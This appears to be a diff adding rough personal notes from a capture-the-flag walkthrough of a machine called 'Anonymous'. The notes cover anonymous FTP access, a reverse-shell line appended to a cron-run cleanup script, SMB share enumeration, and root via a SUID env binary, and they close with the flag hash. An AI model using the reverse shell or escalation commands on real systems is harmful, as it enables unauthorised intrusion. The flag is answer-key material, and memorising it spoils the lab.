@@ -1,0 +1,30 @@
+Anonymous:
+21
+anonymous login allowed
+scripts directory 
+to_do.txt
+“I need to disable anonymous login, duhhhh.
+removed_files.log
+Nothing to delete…
+clean.sh - I HAVE RWX PERMS
+removes files in directory
+I can safely assume that the directory is cleaned on a clock…I can write a revshell and execute it…
+exploit
+vim revshell
+/bin/bash -i >& /dev/tcp/10.6.15.130/4444 0>&1
+ftp> append revshell clean.sh
+eventually will execute and boom revshell
+22
+139
+445
+smbmap -H 10.10.6.225
+smbclient //10.10.6.225/pics
+get corgo2.jpg
+get puppos.jpeg
+namelessone
+linpeas
+interesting things in cron
+suid on /usr/bin/env
+/usr/bin/env /bin/sh -p
+whoami - root
+4d930091c31a622a7ed10f27999af363
